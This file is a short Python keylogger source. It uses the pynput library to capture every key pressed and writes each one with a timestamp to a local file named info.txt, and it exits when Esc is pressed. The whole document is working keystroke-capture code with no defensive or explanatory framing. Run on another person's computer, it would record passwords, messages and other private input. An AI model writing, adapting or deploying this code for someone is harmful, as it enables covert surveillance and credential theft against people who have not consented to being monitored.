from pynput.keyboard import Key, Listener
import logging
import sys

# blank if same folder
log_dir = ""

logging.basicConfig(filename=(log_dir + "info.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    logging.info(key)

def on_release(key):
    if str(key) == 'Key.esc':
        sys.exit(0)

if __name__ == "__main__":
    with Listener (on_press=on_press, on_release=on_release) as listener:
        listener.join()
